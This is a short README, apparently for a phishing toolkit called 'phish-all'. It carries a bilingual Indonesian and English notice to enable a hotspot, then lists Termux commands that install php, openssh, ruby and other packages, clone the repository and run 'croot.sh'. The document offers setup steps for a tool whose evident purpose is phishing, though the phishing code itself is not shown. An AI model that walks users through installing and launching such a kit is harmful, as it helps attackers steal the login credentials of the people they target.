# phish-all
PERHATIAN !

(tolong sebelum memulai nyalakan hostpot anda dulu agar script bekerja)

(please before starting, turn on your hostpot first so that the script works)




$ pkg update && pkg upgrade

$ pkg install python2

$ pkg install bash

$ pkg install ruby

$ gem install lolcat

$ pkg install figlet

$ pkg install toilet

$ pkg install openssh

$ pkg install php

$ pkg install git

$ git clone https://github.com/reyspeed/phish-all

$ cd phish-all

$ bash croot.sh
